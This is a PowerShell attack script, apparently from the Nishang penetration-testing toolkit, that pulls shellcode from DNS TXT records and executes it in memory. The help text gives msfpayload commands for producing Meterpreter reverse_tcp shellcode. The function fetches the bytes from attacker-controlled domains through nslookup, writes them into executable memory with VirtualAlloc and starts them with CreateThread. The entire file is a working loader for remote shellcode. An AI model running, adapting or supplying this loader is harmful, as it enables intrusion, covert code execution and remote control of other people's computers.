<#
.SYNOPSIS
Payload which could execute shellcode from DNS TXT queries.

.DESCRIPTION
This payload is able to pull shellcode from txt record of a domain. It has been tested for 
first stage of meterpreter shellcode generated using msf.
Below commands could be used to generate shellcode to be usable with this payload
./msfpayload windows/meterpreter/reverse_tcp LHOST= EXITFUNC=process C | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- |sed 's/^[^0]*\(0.*\/\*\).*/\1/' | sed 's/.\{2\}$//' | tr -d '\n'
./msfpayload windows/x64/meterpreter/reverse_tcp LHOST= EXITFUNC=process C | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- |sed 's/^[^0]*\(0.*\/\*\).*/\1/' | sed 's/.\{2\}$//' | tr -d '\n'

.PARAMETER shellcode32
The domain (or subdomain) whose TXT records would hold 32-bit shellcode.

.PARAMETER shellcode64
The domain (or subdomain) whose TXT records would hold 64-bit shellcode.

 .PARAMETER AUTHNS
Authoritative Name Server for the domains.


.EXAMPLE
PS > Execute-DNSTXT-Code
The payload will ask for all required options.

.EXAMPLE
PS > Execute-DNSTXT-Code 32.alteredsecurity.com 64.alteredsecurity.com ns8.zoneedit.com
Use above from non-interactive shell.

.LINK
http://labofapenetrationtester.blogspot.com/
https://github.com/samratashok/nishang

.NOTES
The code execution logic is based on this post by Matt.
http://www.exploit-monday.com/2011/10/exploiting-powershells-features-not.html
#>



function Execute-DNSTXT-Code
{
    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $ShellCode32,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $ShellCode64,

        [Parameter(Position = 2, Mandatory = $True)]
        [String]
        $AuthNS
    )

    $code = (Invoke-Expression "nslookup -querytype=txt $shellcode32 $AuthNS")  
    $tmp = $code | select-string -pattern "`"" 
    $tmp1 = $tmp -split("`"")[0] 
    [string]$shell = $tmp1 -replace "`t", "" 
    $shell = $shell.replace(" ", "") 
    [Byte[]]$sc32 = $shell -split ',' 
    $code64 = (Invoke-Expression "nslookup -querytype=txt $shellcode64 $AuthNS")  
    $tmp64 = $code64 | select-string -pattern "`"" 
    $tmp164 = $tmp64 -split("`"")[0] 
    [string]$shell64 = $tmp164 -replace "`t", "" 
    $shell64 = $shell64.replace(" ", "") 
    [Byte[]]$sc64 = $shell64 -split ',' 
    $code = @' 
    [DllImport("kernel32.dll")] 
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); 
    [DllImport("kernel32.dll")] 
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); 
    [DllImport("msvcrt.dll")] 
    public static extern IntPtr memset(IntPtr dest, uint src, uint count); 
'@ 
    $winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru 
    [Byte[]]$sc = $sc32 
    if ([IntPtr]::Size -eq 8) {$sc = $sc64} 
    $size = 0x1000 
    if ($sc.Length -gt 0x1000) {$size = $sc.Length} 
    $x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40) 
    for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)} 
    $winFunc::CreateThread(0,0,$x,0,0,0) 
    while(1)
    {
        start-sleep -Seconds 100
    }
}

